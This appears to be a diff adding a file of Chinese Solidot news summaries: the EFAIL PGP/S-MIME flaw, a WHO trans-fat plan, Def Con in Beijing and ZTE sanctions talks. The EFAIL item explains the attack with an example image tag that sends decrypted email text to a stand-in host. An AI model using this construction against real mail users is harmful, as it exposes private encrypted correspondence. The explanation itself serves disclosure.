@@ -1,0 +1,31 @@
+➜PGP 和 S/MIME 高危漏洞会暴露加密邮件的明文
+https://www.solidot.org/story?sid=56501	47749
+<a href="/~xuan">xuan</a> 写道<i> "该漏洞主要原理：在加密块前后插入外置资源引用字段。
+</i><i>
+</i>
+<p><i>比如邮件内容是ABC加密后变为XXX。邮件内容会有很多块组成，多数邮件客户端支持部分块加密、部分块不加密的功能。攻击者可以在加密块前后插入明文块，使得消息变为：</i></p>
+<i>
+</i>
+<p><i>&lt;img src="https://someweb.site/XXX" /&gt;</i></p>
+<i>
+</i>
+<p><i>当邮件客户端收到邮件时，需要对加密块解密，并与非加密的内容拼接。得到以下结果：</i></p>
+<i>
+</i>
+<p><i>&lt;img src="https://someweb.site/ABC" /&gt;</i></p>
+<i>
+</i>
+<p><i>
+在邮件客户端渲染这封邮件的时候，会自动的请求someweb.site，并上传邮件内容ABC。导致邮件泄密。</i></p>
+<i>
+</i>
+<p><i>参考来源 https://www.eff.org/deeplinks/2018/05/attention-pgp-users-new-vulnerabilities-require-you-take-action-now</i></p>
+➜WHO 计划五年内停用工业生产的反式脂肪酸
+https://www.solidot.org/story?sid=56502	56001
+世界卫生组织<a href="http://www.who.int/zh/news-room/detail/14-05-2018-who-plan-to-eliminate-industrially-produced-trans-fatty-acids-from-global-food-supply" target="_blank"><u>公布了指导意见</u></a>，计划逐步在全球食品供应中停用工业生产的反式脂肪酸。停用反式脂肪对维护健康和挽救生命极为重要。据世卫组织估计，每年有 50 多万人因摄入反式脂肪而死于心血管疾病。工业生产的反式脂肪见于人造黄油和酥油等硬化植物脂肪中，零食、烘焙食品和油炸食品往往含有工业生产的反式脂肪。反式脂肪的保质期比其它脂肪的保质期要长，因此，生产商经常使用反式脂肪。但可以使用不影响食品口味或成本的较有益健康的替代品。该计划列出了六项战略行动，确保在食品供应中及时、全面和永久停用工业生产的反式脂肪。
+➜Def Con 黑客大会首次在中国举办
+https://www.solidot.org/story?sid=56503	56226
+世界最大的美国黑客大会之一<a href="http://www.ftchinese.com/story/001077572" target="_blank"><u>首次在中国举办</u></a>，尽管中国政府警告公民不要与国际安全社区分享工具，但此次大会仍然吸引了大批人参加。随着中国寻求收紧对技术和信息的控制，政府命令本土黑客放弃参加一些全球黑客大赛，尽管如此，上周末仍有逾 1300 人参加了在北京举行的 Def Con 全球黑客大会。“中国成为（在美国以外）举办 Def Con 的最佳地点，是因为未来互联网安全领域确实将会有两个超级大国：美国和中国，”该大会的创办人 Jeff Moss 称，“安全问题是全球性问题，需要全球应对。”该大会强调包括潜在软件漏洞在内的全面开源共享，它试图创造一个空间，使来自不同国家和企业的所谓 “黑客”——出于乐趣（有时是为了赚钱）在计算系统中寻找漏洞和潜在薄弱环节的计算机高手——和网络安全专业人士可以在此分享观点。
+➜美中接近就放宽中兴制裁达成协议
+https://www.solidot.org/story?sid=56504	57157
+《华尔街日报》援引消息来源<a href="https://cn.wsj.com/articles/CN-BGH-20180515074226" target="_blank"><u>报道</u></a>（付费墙），美中接近就放宽中兴制裁达成协议，中兴通讯可能获得暂缓制裁，作为交换，中国将取消对数以十亿计美元美国农产品的关税举措。此外，中国还将加快高通收购恩智浦的交易审批。特朗普承诺帮助中兴一事在美国议员中引起了<a href="https://cn.reuters.com/article/usa-china-zte-trump-washingtondefends-05-idCNKCS1IG00A" target="_blank"><u>强烈反响</u></a>，他们认为这一做法可能削弱美国在即将举行的与中国的贸易谈判中的优势。而美国商务部长罗斯周一<a href="https://cn.reuters.com/article/ross-zte-remedy-alternative-0514-mon-idCNKCS1IG00M" target="_blank"><u>表示</u></a>，美国将考虑是否有其他方式来处理中兴通讯违返美国制裁法的行为。
